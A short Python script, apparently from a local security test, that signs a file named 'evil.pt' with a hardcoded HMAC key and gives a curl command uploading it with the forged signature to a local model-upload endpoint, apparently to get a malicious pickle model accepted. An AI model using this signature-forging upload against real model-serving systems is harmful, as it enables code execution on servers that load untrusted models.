# Local Attack scenario 2 (test)
# generate a sig with the HMAC key

import hmac, hashlib
KEY = "pickle_tickle".encode()  
data = open("payloads/evil.pt","rb").read()
print(hmac.new(KEY, data, hashlib.sha256).hexdigest())

'''
How to Attack in Local :
curl -s -X POST http://localhost:5000/upload_model \
  -F "file=@evil.pt" \
  -F "sig=ed6c0856ea182a5345a01cf987e26ab1a5998e70550f226e02d1917a1652f002"
'''